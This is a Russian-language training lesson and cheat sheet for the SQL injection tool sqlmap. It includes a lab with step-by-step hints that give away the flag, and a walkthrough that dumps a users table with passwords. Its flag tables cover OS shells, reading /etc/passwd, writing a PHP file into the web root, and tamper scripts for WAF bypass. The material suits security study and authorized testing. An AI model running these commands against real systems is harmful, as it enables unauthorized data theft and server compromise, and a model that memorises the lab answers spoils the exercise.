---
id: web-tool-sqlmap
title: "sqlmap: справочник флагов, дампа и обхода WAF"
category: web
parent: web-tools-sqli
difficulty: medium
order: 1
tags: [sqlmap, sqli, tooling, injection, exploitation, cheat-sheet]
prerequisites: [web-sqli]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 55
summary: "Все флаги sqlmap с примерами: цели, детект, дамп, OS-shell, tamper и готовые рецепты на любой случай."
lab:
  kind: shell
  title: "Практика: sqlmap — детект и дамп"
  toolset: [core, curl, sqlmap]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - Сначала посмотри нормальный ответ: `curl -s 'http://shop.lab.local/product?id=1'`.
    - Запусти sqlmap: `sqlmap -u 'http://shop.lab.local/product?id=1' --batch --dump`.
    - sqlmap определит SQLite, найдёт таблицы `products` и `secrets`.
    - В таблице `secrets` есть строка `flag` — её значение и есть ответ.
    - Достань флаг из вывода: добавь к команде ` | grep 'nto{' | cut -d'|' -f4 > found.txt`, затем `check`.
---

## Задача

Ты нашёл подозрительный параметр `id` и хочешь быстро ответить на три вопроса: есть ли инъекция, какая это база и что в ней лежит. Вручную это десятки запросов. **sqlmap** — автоматический эксплуататор SQL-инъекций, который делает всю рутину сам: фингерпринт, подбор техники, дамп таблиц, а иногда и OS-shell.

В этом уроке мы проведём `sqlmap` по одному живому параметру от обнаружения до дампа — а в конце будет полная таблица флагов как шпаргалка.

## Данные, с которыми работаем

Цель — `http://shop.example/product?id=1`. Начинаем с самого простого: указать URL и попросить проверить параметр. Флаги `--batch` (не задавать вопросов) и `--level/--risk` (глубина проверок) задают поведение.

```bash
$ sqlmap -u "http://shop.example/product?id=1" --batch --level=2 --risk=2 --technique=BEU
...
[INFO] testing if GET parameter 'id' is dynamic
[INFO] GET parameter 'id' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite'
[INFO] GET parameter 'id' is 'SQLite >= 3.9 AND error-based' injectable
[INFO] target URL appears to have 3 columns in query
[INFO] GET parameter 'id' is 'Generic UNION query (NULL)' injectable
```

sqlmap сам определил: инъекция есть, база — **SQLite**, в запросе **3 колонки**, работают boolean, error-based и UNION. В конце он печатает сводку:

```text
sqlmap identified the following injection point(s):
---
Parameter: id (GET)
    Type: boolean-based blind
    Payload: id=1 AND 7506=7506
    Type: error-based
    Payload: id=1 AND 2927=JSON_EXTRACT(...)
    Type: UNION query
    Payload: id=1 UNION ALL SELECT NULL,<данные>,NULL-- olOA
---
```

Флаг `--technique=BEU` ограничил проверки техниками **B**oolean, **E**rror, **U**nion — это ускоряет скан. Если не ограничивать, sqlmap переберёт всё, включая time-blind (медленно).

## Шаг 1: дамп данных

Дальше просим дамп. У SQLite нет отдельных баз, поэтому `--dbs` не сработает, зато есть `--tables`:

```bash
$ sqlmap -u "http://shop.example/product?id=1" --batch --technique=BEU --tables
[INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[2 tables]
+----------+
| products |
| users    |
+----------+
```

Есть таблица `users`. Дампнём её:

```bash
$ sqlmap -u "http://shop.example/product?id=1" --batch --technique=BEU -T users --dump
Database: <current>
Table: users
[2 entries]
+----+-------+----------+----------+
| id | role  | password | username |
+----+-------+----------+----------+
| 1  | admin | S3cr3t!  | admin    |
| 2  | user  | hunter2  | alice    |
+----+-------+----------+----------+
[INFO] table 'SQLite_masterdb.users' dumped to CSV file '.../users.csv'
```

Учётки получены. Обрати внимание: sqlmap сам подобрал колонки и вывел их в виде таблицы — это и есть доказательство инъекции.

## Шаг 2: цели, кроме URL

Параметр не всегда в URL. sqlmap принимает цель несколькими способами:

| Способ | Флаг | Когда |
|--------|------|-------|
| URL с параметром | `-u "http://t/?id=1"` | простой GET |
| POST-данные | `--data='user=a&pass=b'` | форма логина |
| Сохранённый запрос | `-r request.txt` | cookie и заголовки важны |
| Cookie | `--cookie='PHPSESSID=x'` | авторизованная зона |
| Из Burp (лог) | `-l burp.log` | есть история прокси |

Для аутентифицированных целей удобнее всего `-r request.txt`: сохрани запрос из Burp в файл, и sqlmap возьмёт оттуда и cookie, и заголовки, и тело.

## Шаг 3: параметры и детект

| Флаг | Что делает |
|------|-----------|
| `-p id` | тестировать только параметр `id` |
| `--skip=csrf` | исключить параметр `csrf` |
| `--level=1..5` | глубина проверок (5 — заголовки, User-Agent) |
| `--risk=1..3` | 3 — рискованные payload (UPDATE/OR) |
| `--technique=BEUSTQ` | какие техники пробовать |
| `--dbms=mysql` | не тратить время на другие СУБД |
| `--threads=4` | параллельные запросы |
| `--random-agent` | случайный User-Agent |

## Шаг 4: перечисление и дамп

| Флаг | Что достаёт |
|------|-------------|
| `--dbs` | список баз |
| `--tables` | таблицы |
| `-D db -T users --columns` | колонки |
| `-D db -T users -C user,pass --dump` | только нужные колонки |
| `--dump-all` | всё (шумно!) |
| `--count` | только число строк |
| `--where="id=1"` | фильтр строк |
| `--exclude-sysdbs` | без системных баз |

## Шаг 5: за пределы данных — файлы и OS-shell

| Флаг | Что делает |
|------|-----------|
| `--sql-shell` | интерактивный SQL-запрос |
| `--os-shell` | интерактивная оболочка ОС |
| `--os-cmd='id'` | выполнить одну команду |
| `--file-read=/etc/passwd` | прочитать файл |
| `--file-write=./s.php --file-dest=/var/www/html/s.php` | записать файл |
| `--sql-query='SELECT ...'` | один запрос |

`--os-shell` работает, только если у базы есть примитив запуска команд (UDF в MySQL, `xp_cmdshell` в MSSQL, `COPY ... PROGRAM` в PostgreSQL). Для SQLite его обычно нет.

## Шаг 6: обход WAF — tamper

Когда фильтр режет ключевые слова, sqlmap пропускает payload через **tamper-скрипты** — маленькие преобразования. Указываются цепочкой через запятую:

| Tamper | Что подменяет |
|--------|---------------|
| `space2comment` | пробел → `/**/` |
| `between` | `>` → `NOT BETWEEN 0 AND` |
| `charencode` | URL-кодирование |
| `randomcase` | меняет регистр ключевых слов |
| `apostrophemask` | `'` → `%EF%BC%87` (полноширинная) |
| `charunicodeencode` | unicode-кодирование |

```bash
$ sqlmap -r request.txt -p id --batch --tamper=space2comment,between,charencode --random-agent
```

Начни с одного-двух tamper'ов и добавляй по одному — длинная цепочка ломает payload сама по себе.

## Полная таблица флагов (кратко)

| Категория | Флаги |
|-----------|-------|
| Цель | `-u`, `-r`, `-l`, `-m`, `--data`, `--cookie`, `-p` |
| Детект | `--level`, `--risk`, `--technique`, `--dbms`, `--string`, `--not-string`, `--code` |
| Дамп | `--dbs`, `--tables`, `-D`, `-T`, `-C`, `--dump`, `--columns`, `--count` |
| Продвинутое | `--sql-shell`, `--os-shell`, `--os-cmd`, `--file-read`, `--file-write` |
| WAF | `--tamper`, `--random-agent`, `--delay`, `--proxy`, `--tor` |
| Скорость | `--threads`, `--batch`, `--smart`, `--time-sec` |
| OOB | `--dns-domain`, `--dns-server` |

## Что мы теперь знаем

- **`-u` / `-r` / `--data`** — три способа задать цель; для авторизованных зон бери `-r request.txt`.
- **`--technique=BEU`** ускоряет скан: не перебирай то, что не нужно.
- **`--batch`** обязателен для скриптов и неинтерактивной работы.
- **`--tables` → `-T --dump`** — базовый маршрут к данным.
- **`--os-shell`** возможен только там, где у базы есть примитив выполнения команд.
- **`--tamper`** — против WAF, но цепочку собирай осторожно.

## На что смотреть дальше

- **Начинай с малого `--level/--risk`.** Высокие значения шумят и могут изменить данные.
- **`--risk=3` опасен:** добавляет `OR`-payload и UPDATE-подобные проверки — на проде только с согласия.
- **Не `--dump-all` без нужды.** Это гигабайты трафика и полный шум в логах.
- **Сохраняй сессию.** sqlmap кэширует результаты в `~/.sqlmap/output/` — повторные запуски быстрее.
- **Проверяй false positive.** Если ответ приложения одинаков на всё, sqlmap может ошибиться — подтверди payload вручную через `curl`.
- **Права и этика.** `--os-shell` и `--file-write` меняют систему; только с разрешения.

## Техники инъекции: `--technique` и когда что

sqlmap по умолчанию перебирает техники сам, но понимание букв в `--technique` экономит время. `B` — boolean-based blind: подставляем условие и по разнице страниц угадываем бит за битом, медленно, но работает почти везде. `E` — error-based: вытаскиваем данные через сообщения об ошибках, самый быстрый, когда СУБД их отдаёт. `U` — union-based: добавляем свой `SELECT` и читаем данные прямо в ответе. `S` — stacked queries: несколько запросов через `;`, нужен для `--os-shell` на MSSQL. `T` — time-based blind: измеряем задержку (`SLEEP`/`pg_sleep`), работает, даже когда ошибки скрыты. `Q` — inline queries. Практика: начинай с `--technique=BEU`, а если ответы одинаковы и ошибки скрыты — добавляй `T`. Для ускорения задавай `--dbms`, `--level`, `--risk` осознанно: высокий `risk` может изменить данные.

## От инъекции к ОС: `--os-shell`, файлы и что проверить

Когда инъекция подтверждена, sqlmap умеет выйти за пределы данных. `--file-read`/`--file-write` читают и пишут файлы на сервере (если у СУБД есть права). `--os-shell` даёт интерактивную оболочку: на MySQL это UDF, на PostgreSQL — `COPY ... TO PROGRAM`, на MSSQL — `xp_cmdshell`. Важно: `--os-shell` часто требует, чтобы СУБД работала от привилегированного пользователя или чтобы были включены соответствующие функции. После получения shell всегда проверяй, кто ты на хосте (`whoami`, `id`, `sudo -l`) и есть ли сетевой доступ дальше, — база данных это хост прежде всего. И не забывай, что `--os-shell` оставляет следы: он пишет временные файлы и создаёт функции, которые может заметить защита.

## Квиз

Проверь себя.

```quiz
- question: "Как sqlmap возьмёт cookie и заголовки из сохранённого запроса Burp?"
  options:
    - "--cookie"
    - "-r request.txt"
    - "--data"
    - "--proxy"
  answer: 1
  explanation: "-r читает полный HTTP-запрос из файла, включая cookie, заголовки и тело."
- question: "Что делает флаг --technique=BEU?"
  options:
    - "Ускоряет дамп"
    - "Ограничивает проверки Boolean, Error и Union техниками"
    - "Включает OS-shell"
    - "Оборачивает payload в tamper"
  answer: 1
  explanation: "B/E/U — Boolean, Error-based, Union; остальные техники (например, time) не пробуются."
- question: "Какая команда дампит только колонки username и password таблицы users?"
  options:
    - "--dump-all"
    - "-T users --dump"
    - "-T users -C username,password --dump"
    - "--columns"
  answer: 2
  explanation: "-C задаёт конкретные колонки, что ускоряет дамп и снижает шум."
- question: "Для чего нужны tamper-скрипты?"
  options:
    - "Для ускорения"
    - "Для обхода WAF/фильтров преобразованием payload"
    - "Для дампа схемы"
    - "Для смены СУБД"
  answer: 1
  explanation: "Tamper подменяет пробелы, регистр, кавычки и т.п., обходя сигнатуры фильтра."
- question: "Почему --os-shell может не работать на SQLite?"
  options:
    - "SQLite слишком новый"
    - "У SQLite обычно нет примитива выполнения команд ОС"
    - "Нужен --tor"
    - "Нужен --risk=3"
  answer: 1
  explanation: "OS-shell требует возможности запускать команды из базы; в SQLite её обычно нет."
```

## Куда дальше

Иногда `sqlmap` слеп: параметр нестандартный, транспорт необычный, WAF режет всё. Тогда спасает ручная работа — следующий урок (`web-tool-sqli-manual`) разбирает полный ручной workflow от кавычки до дампа. А пока главное запомни: `sqlmap` — это конвейер `-u/-r` → `--tables` → `-T --dump`, а `--technique`, `--level` и `--tamper` настраивают его под цель.

## Где пригодится

- **CTF (Web):** быстрый дамп флага из уязвимого параметра.
- **Bug bounty:** подтверждение инъекции и извлечение данных для отчёта.
- **Пентест:** стандартный инструмент подтверждения и эксплуатации SQLi; экономит часы.
- **Работа (AppSec):** понимание, что видит автоматический сканер, помогает закрывать реальные, а не только «сканируемые» дыры.
